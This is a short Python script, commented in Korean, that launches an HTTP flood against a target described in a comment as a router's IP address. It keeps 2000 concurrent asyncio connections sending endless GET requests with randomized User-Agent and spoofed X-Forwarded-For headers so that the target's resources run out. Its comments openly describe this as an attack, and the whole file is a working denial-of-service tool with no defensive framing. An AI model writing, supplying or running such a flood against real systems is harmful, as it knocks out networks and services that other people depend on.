import asyncio
import aiohttp
import random

# 역사고: 타겟 및 화력 설정
TARGET = "http://123.456.78.90" # 공유기 IP
CONCURRENCY = 2000 # 동시에 유지할 연결 수 (무지막지하게 올림)

async def attack_task(session):
    while True:
        try:
            # 타겟 공유기의 리소스를 고갈시키기 위해 헤더를 무작위로 생성
            headers = {
                'User-Agent': str(random.random()),
                'Cache-Control': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            async with session.get(TARGET, headers=headers, timeout=1) as response:
                # 응답을 기다리지 않고 즉시 다음 공격 수행
                pass
        except:
            await asyncio.sleep(0.01) # 에러 시 아주 잠깐 대기 후 즉시 재시작

async def main():
    # 역사고 실행: 호스팅 서버의 소켓 제한까지 연결을 생성
    connector = aiohttp.TCPConnector(limit=CONCURRENCY, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [attack_task(session) for _ in range(CONCURRENCY)]
        print(f"화력 집중: {TARGET}을 향해 {CONCURRENCY}개의 비동기 스트림 가동.")
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
